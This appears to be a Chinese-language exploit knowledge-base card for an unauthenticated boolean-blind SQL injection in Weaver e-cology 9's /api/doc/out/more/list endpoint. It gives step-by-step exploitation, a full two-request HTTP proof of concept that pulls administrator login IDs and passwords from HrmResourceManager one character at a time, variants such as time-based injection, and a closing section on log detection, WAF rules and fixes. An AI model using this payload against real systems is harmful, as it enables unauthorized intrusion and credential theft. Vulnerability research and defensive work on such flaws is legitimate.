---
id: web-generic-sqli-weaver-e9-doc-out-more-list-boolean-blind
title: 泛微 e9 /api/doc/out/more/list 未授权布尔盲注：两段式 sessionKey 与 counts 判真
type: scenario
domain: web
path: web/generic/sqli
technique: weaver-e9-doc-out-more-list-boolean-blind
aliases:
- 泛微 e9 /api SQL 注入
- 泛微 doc/out/more/list 注入
- 泛微 sessionKey 注入
- 泛微 e9 布尔盲注
- dataKey 二次触发
- 泛微 HrmResourceManager 盲注
tags:
- sqli
- java
- weaver
- ecology
- oa
- boolean-blind
- union-free
- session-key
- unauth
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V41
  verified_at: '2026-11-05T06:29:21+08:00'
  notes: 已对照原文核对：/api/doc/out/more/list 拼 SQL 并绑定 sessionKey、/api/ec/dev/table/counts 以 dataKey 触发、count>0 作为布尔 oracle、最终 SQL 与参数接力方式均与卡片一致。该部分截图在原文中为远程图片未落盘，依据正文完整 PoC 核对；affected_versions 原为分析环境版本，已清除。未实际复现。
---

## 一句话结论

泛微 e9 的 `/api/doc/out/more/list` 把多个 `doc*date*` 参数直接拼进文档检索 SQL，并先把 SQL 模板与 `sessionKey` 绑定返回；随后向 `/api/ec/dev/table/counts` 提交 `dataKey=<sessionKey>_<hash>` 才执行该 SQL。由于 `/api/*` 的 `SessionFilter` 把该接口列入免登录白名单，未授权用户可借助 `count > 0` 的布尔差异，逐字符读出 `HrmResourceManager` 中的管理员账号。

## 原理

- **路由与鉴权**：`/api/*` 由 `com.cloudstore.dev.api.service.SessionFilter` 拦截，未登录时依据 `checkUrl`、`uncheckUrl`、`uncheckSessionUrl` 三组白名单判断；三组值从 `WEB-INF/prop` 配置文件读取。只有 `uncheck` 系列接口构成前台攻击面，`/api/doc/out/more/list` 正在其中。
- **SQL 构造**：`com.api.doc.search.web.DocOutMoreAction#getDataList` 调 `DocListUtil` 提取 `docarchivedatefrom`、`doccreatedatefrom`、`doclastmoddatefrom`、`docarchivedateto`、`doccreatedateto`、`doclastmoddateto` 等参数，拼成 `sqlwhere`；`getMoreList` 再拼接完整查询，生成 XML 模板并与 `sessionKey` 关联，但此时不执行。
- **二次触发**：第二个请求 `POST /api/ec/dev/table/counts` 携带 `dataKey=sessionKey_<hash>`，服务端取出模板执行，返回 `count`。`count > 0` 说明注入的布尔条件为真。
- **注入形态**：各 `doc*` 参数用 `*/ ... /*` 注释片段互相“接力”，把原本的日期比较闭合后拼入 `OR` 条件。原文的判定条件把 `hex(SUBSTRING(loginid,1,1))` 与 `'073'` 比较：`0x73` 是 `s`，命中时 `OR` 右侧成立，查询返回数据，`count` 大于 0。
- **为什么可盲注**：接口不回显 SQL 结果，只返回条数；以“条件为真则 count>0”为 oracle，即可逐字符二分/枚举 `loginid`、`password` 等字段。

## 触发条件

- 目标为泛微 e-cology 9（原文环境 9.00.210804 v10.42），`/api/doc/out/more/list` 在 `SessionFilter` 的免登录白名单中。
- 目标可访问 `/api/*`，且 `/api/ec/dev/table/counts` 能被调用。
- 数据库为 MySQL，`DocDetail`、`HrmResourceManager` 等表存在；`count` 能反映查询是否命中。
- 注入参数未被全角化或额外过滤（`/api/*` 不经过 `/weaver/*` 的 `XssRequestWeblogic` 路径）。

## 利用步骤

1. 发送第一个 GET 请求，带上 `isNew=1`、`elementmore` 与六个 `doc*` 参数；响应中记录 `sessionKey`。
2. 从响应里取出 `sessionKey`，拼成 `dataKey=<sessionKey>_<hash>`；原文示例为 `<uuid>_<32 位十六进制>`。
3. 发送第二个 POST 请求到 `/api/ec/dev/table/counts`，body 为 `dataKey=...`。
4. 若响应 `count > 0`，当前注入条件为真；否则为假。
5. 要猜下一个字符，改 `doccreatedateto` 中的 `loginid,1,1` 位置与 `'073'` 猜测值；要换表/字段，改 `doclastmoddateto` 中的 `from HrmResourceManager limit 0,1`。
6. 逐字符枚举 `loginid` 与 `password`（或先取 `loginid` 再取密码）。

## PoC

第一段：生成并绑定 SQL 模板（原文请求，URL 编码保留）：

```http
GET /api/doc/out/more/list?isNew=1&elementmore=%7B%22srcType%22%3A%20%222%22%2C%20%22srcContent%22%3A%20%22%2A%2F%3D%28%28-1%22%2C%20%22perpage%22%3A%20%2210%22%7D&docarchivedatefrom=a%27OR-1%2F%2Aa&doccreatedatefrom=%2A%2F%3D%28%2F%2Aa&doclastmoddatefrom=%2A%2FSELECT-3%2Blocate%2F%2A&docarchivedateto=%2A%2F%28hex%28SUBSTRING%28%2F%2A&doccreatedateto=%2A%2Floginid%2C1%2C1%29%29%2C%27073%27%29%20%2F%2A&doclastmoddateto=%2A%2Ffrom%20HrmResourceManager%20limit%200%2C1%29%20OR-1%2F%2A HTTP/1.1
Host: target:8060
Accept: */*
```

第二段：触发执行并观察 count：

```http
POST /api/ec/dev/table/counts HTTP/1.1
Host: target:8060
Content-Type: application/x-www-form-urlencoded

dataKey=628a12ff-5528-46d7-9092-0deee8460e88_6FEEFE091B16AD0A942D78E12C136D76
```

`dataKey` 前半段替换为第一段响应中的 `sessionKey`。若 `count > 0`，说明 `loginid` 首字符 hex 为 `0x73`（`s`）；把 `'073'` 改为其他十六进制值即可测试其他字符。

拼接后的关键 SQL 形如：

```sql
select count(*) from (
  select ... from DocDetail t1
  where docarchivedate>='a' OR -1 /* a'
    and doccreatedate >= '*/=(/* a'
    and doclastmoddate >= '*/SELECT-3+locate/*'
    and docarchivedate<='*/(hex(SUBSTRING(/*'
    and doccreatedate <= '*/loginid,1,1)),'073') /*'
    and doclastmoddate <= '*/from HrmResourceManager limit 0,1) OR -1 /*'
    ...
)
```

## 变体与关联

- 替换子查询目标：`loginid` 换成 `password`、`id`，或换成其他表字段；`HrmResourceManager` 换成任意表名。
- 若 `count` 的回显被关闭，可改为时间盲注（`IF(cond,SLEEP(1),0)`）或报错注入。
- `SessionFilter` 白名单存放在 `WEB-INF/prop`，不同版本/补丁可能增删；接口可达性需以实际配置为准。
- 关联：[[web-generic-sqli-weaver-e9-filedownloadlocation-union-file-read]]（同一产品的未授权 SQL 注入，但那边是 union 直接回显；本卡是两段式布尔盲注）。
- 关联：[[web-generic-sqli-weaver-e9-browser-jsp-double-slash-sqli]]（同产品另一条 `/mobile/*` 路由的 union 注入）。

## 检测与防御

- **日志检测**：`/api/doc/out/more/list` 的 `doc*` 参数出现 `*/`、`/*`、`OR-1`、`SUBSTRING`、`hex(`、`HrmResourceManager`；短时间两次请求（先 list 后 counts）且 `dataKey` 前缀相同；同一来源反复请求 counts 且响应 count 在 0/非 0 间变化。
- **WAF**：对 `doc*` 参数做日期格式严格校验，出现注释符、引号、SQL 关键字即拒绝；对 `dataKey` 校验绑定的会话与来源。
- **修复**：日期参数使用预编译/日期类型转换，不拼接 SQL；`getMoreList` 生成的模板应带参数占位符而非字符串拼接；`counts` 接口校验 `sessionKey` 归属和一次性使用。
- **加固**：收紧 `SessionFilter` 的 uncheck 白名单；对 `/api/*` 全量鉴权；限制数据库账号权限；升级到修复版本。
